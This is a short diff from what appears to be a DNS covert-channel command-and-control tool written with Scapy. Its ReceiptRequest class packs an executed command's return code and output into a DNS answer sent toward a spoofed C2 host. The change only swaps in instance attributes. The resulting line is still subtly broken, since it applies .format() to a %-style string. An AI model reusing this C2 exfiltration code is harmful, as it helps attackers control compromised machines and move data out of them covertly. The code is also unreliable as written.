@@ -19,7 +19,7 @@ class ReceiptRequest:
         dns = DNS(
             qr=PACKET_OPTIONS['DNS']['QR'],
             qd=DNSQR(qname=CC_SERVER_SPOOFED_HOST, qtype=RequestType.RECEIPT.value),
-            an=DNSRR(rrname=self.cmd, type=PACKET_OPTIONS['DNS']['AN']['TYPE'], rdata="%d\n%s".format(retcode, output))
+            an=DNSRR(rrname=self.cmd, type=PACKET_OPTIONS['DNS']['AN']['TYPE'], rdata="%d\n%s".format(self.retcode, self.output))
         )
     
     def send(self):
